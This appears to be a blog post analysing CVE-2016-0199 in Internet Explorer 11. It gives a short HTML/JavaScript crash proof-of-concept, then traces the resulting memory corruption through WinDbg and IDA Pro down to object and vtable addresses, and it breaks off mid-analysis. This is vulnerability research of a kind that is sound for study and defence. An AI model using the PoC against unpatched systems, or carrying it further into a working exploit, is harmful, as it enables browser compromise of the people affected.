---
layout: post
title: "CVE-2016-0199"
date: 2018-05-15 15:02:16 -0500
comments: true
categories: 
---

###0x0 Enviroment:

* Windows 7 SP1 32-bit
* IE 11
* Windbg
<!--more-->

###0x1 POC:

```html
<meta http-equiv="X-UA-Compatible" content="IE=7">
<script>
oElement = document.createElement("IMG");
var oAttr = document.createAttribute("loop");
oAttr.nodeValue = oElement;
oElement.loop = 0x41424344;
oElement.setAttributeNode(oAttr);
oElement.removeAttributeNode(oAttr);
CollectGarbage();
</script>
```

###0x2 Vulnerability Reproduce

Run the poc and get crash in windbg:

{% img  /images/blog/vulnerability/cve_2016_0199/1.PNG  [title manually exploit [alt text]] %}

Here we get Access violation exception

```
jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252:
695b0de2 8b30            mov     esi,dword ptr [eax]  ds:0023:41424344=????????
```
Next we need to locate this code in jscript9.dll in IDA Pro. The address is 0x695b0de2 and we need to get base address of this DLL:


`lmvm jscript9`

lmvm <module> - Dumps information about the module. Remember to use <module> and not <module.dll>. 

{% img  /images/blog/vulnerability/cve_2016_0199/2.PNG  [title manually exploit [alt text]] %}

start address is 0x693b0000, so the address we want to check in IDA Pro is :

`2:051> ? 695b0de2 - 693b0000 + 10000000`

{% img  /images/blog/vulnerability/cve_2016_0199/3.PNG  [title manually exploit [alt text]] %}

so the address is 0x 10200de2.

In IDA Pro, locate the code:
{% img  /images/blog/vulnerability/cve_2016_0199/4.PNG  [title manually exploit [alt text]] %}

based on the code:

```
.text:10200DE2                 mov     esi, [eax]
.text:10200DE4                 mov     ecx, [esi+44h]  ; void *
.text:10200DE7                 call    ds:___guard_check_icall_fptr
.text:10200DED                 call    dword ptr [esi+44h

```
we can guess, eax has C++ object base address and that address -4 should contain vtable address. To verifiy the assumption. Modify the PoC:


```html
<meta http-equiv="X-UA-Compatible" content="IE=7">
<script>
alert(0);
oElement = document.createElement("IMG");
alert(1);
var oAttr = document.createAttribute("loop");
alert(2);
oAttr.nodeValue = oElement;
alert(3);
CollectGarbage();
</script>
```
We want to set break point at jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252

however, since the dll is not loaded when we restart debugging. We can use windbg command `sxe ld:modulename` command to break when jscript9.dll first time load, and then we can set the breakpoint on that address.

`sxe ld:jscript9`
`lmm jscript9`
`bp jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252`
`bl`


{% img  /images/blog/vulnerability/cve_2016_0199/5.PNG  [title manually exploit [alt text]] %}

As you can see, we get the vtable address.

Next rewrite the poc:

```
<meta http-equiv="X-UA-Compatible" content="IE=7">
<script>
alert(0);
oElement = document.createElement("IMG");
alert(1);
var oAttr = document.createAttribute("loop");
alert(2);
oAttr.nodeValue = oElement;
alert(3);
oElement.loop = 0x41424344;
alert(4);
oElement.setAttributeNode(oAttr);
alert(5);
oElement.removeAttributeNode(oAttr);
alert(6);
CollectGarbage();
</script>
```

The poc create IMG object and attribute loop.So we need to find out these two addresss. First of all, set hpa and ust

`gflags /i iexplore.exe +hpa +ust`

Then use IE to open poc file, and attach to windbg,
{% img  /images/blog/vulnerability/cve_2016_0199/7.PNG  [title manually exploit [alt text]] %}

and use `x MSHTML!CImgElement::*` to list all clmgelement functions

{% img  /images/blog/vulnerability/cve_2016_0199/6.PNG  [title manually exploit [alt text]] %}

CreateElement function will create object. set breakpoint here and run

`bp MSHTML!CImgElement::CreateElement; g`

{% img  /images/blog/vulnerability/cve_2016_0199/8.PNG  [title manually exploit [alt text]] %}

Click messagebox in webpage and we hit the breakpoint:

{% img  /images/blog/vulnerability/cve_2016_0199/9.PNG  [title manually exploit [alt text]] %}

step in `p`

{% img  /images/blog/vulnerability/cve_2016_0199/10.PNG  [title manually exploit [alt text]] %}

`p`

{% img  /images/blog/vulnerability/cve_2016_0199/11.PNG  [title manually exploit [alt text]] %}

`p`

{% img  /images/blog/vulnerability/cve_2016_0199/12.PNG  [title manually exploit [alt text]] %}

`p`

{% img  /images/blog/vulnerability/cve_2016_0199/13.PNG  [title manually exploit [alt text]] %}

`p`

{% img  /images/blog/vulnerability/cve_2016_0199/14.PNG  [title manually exploit [alt text]] %}

`p`

{% img  /images/blog/vulnerability/cve_2016_0199/15.PNG  [title manually exploit [alt text]] %}

`p`

{% img  /images/blog/vulnerability/cve_2016_0199/16.PNG  [title manually exploit [alt text]] %}

HeapAlloc creates a buffer, size is 0x5c and the address is in eax, 0x0d524fa0.

{% img  /images/blog/vulnerability/cve_2016_0199/17.PNG  [title manually exploit [alt text]] %}

Address 0x0d524fa0 will be IMG object's address. But why?

Keep going on


a few `p`s

{% img  /images/blog/vulnerability/cve_2016_0199/18.PNG  [title manually exploit [alt text]] %}


since before calling MSHTML!CImgElement::CImgElement, ecx contains eax value 0d524fa0

Use `dps` command (display pointers and symbols):

`dps 0d524fa0`

{% img  /images/blog/vulnerability/cve_2016_0199/19.PNG  [title manually exploit [alt text]] %}

This is vtable address.

next try to search Attribute object base address

`MSHTML!CAttribute::*`

{% img  /images/blog/vulnerability/cve_2016_0199/20.PNG  [title manually exploit [alt text]] %}

It is a constructor function. Put a breakpoint here.

`bp MSHTML!CAttribute::CAttribute`

and `g`, will hit alert(1); in poc. click ok.

keep step in and reach here:

{% img  /images/blog/vulnerability/cve_2016_0199/21.PNG  [title manually exploit [alt text]] %}

so attribute object base address in ebx and its value is 0x0d5a2fa0


so address of IMG is 0x0d524fa0 address of Attribute is 0x0d5a2fa0.

Back to PoC:

```
oAttr.nodeValue = oElement;
```
This line will assign an IMG object to a memeber of the attribute object. Lets search which function can do this:

`x MSHTML!CAttribute::*`

{% img  /images/blog/vulnerability/cve_2016_0199/22.PNG  [title manually exploit [alt text]] %}

seems `MSHTML!CAttribute::put_nodeValue` can do this. set the breakpoint:

`bp MSHTML!CAttribute::put_nodeValue` and go

click ok

{% img  /images/blog/vulnerability/cve_2016_0199/23.PNG  [title manually exploit [alt text]] %}

and we reach MSHTML!CAttribute::put_nodeValue:

{% img  /images/blog/vulnerability/cve_2016_0199/24.PNG  [title manually exploit [alt text]] %}

check the call stack:

{% img  /images/blog/vulnerability/cve_2016_0199/25.PNG  [title manually exploit [alt text]] %}








